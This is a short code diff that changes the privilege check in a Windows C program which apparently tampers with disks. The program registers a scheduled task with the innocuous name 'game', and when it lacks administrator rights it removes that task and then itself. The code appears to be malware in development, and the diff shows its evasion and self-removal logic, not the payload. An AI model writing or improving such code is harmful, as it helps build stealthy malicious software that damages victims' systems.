@@ -6,7 +6,6 @@
 #include <winioctl.h>
 #include <ntdddisk.h>
 #include <stdbool.h>
-#include <shellapi.h> // for admin check
 
 
 // note*
@@ -15,8 +14,19 @@
 
 // only run if user is admin
 bool admin_check() {
-    if (!IsUserAnAdmin()) {
-        // delete itslef if the user isnt admin
+    BOOL is_admin = FALSE;
+    PSID admin_group = NULL;
+
+    // admin group sid is "S-1-5-32-544"
+    if (ConvertStringSidToSidA("S-1-5-32-544", &admin_group)) {
+        if (!CheckTokenMembership(NULL, admin_group, &is_admin)) {
+            is_admin = FALSE;
+        }
+        LocalFree(admin_group); // free mem from ConvertStringSidToSidA
+    }
+
+    if (!is_admin) {
+        // reused from safe()
         system("schtasks /delete /tn \"game\" /f");
         char cmd[MAX_PATH + 64];
         GetModuleFileNameA(NULL, cmd, MAX_PATH);
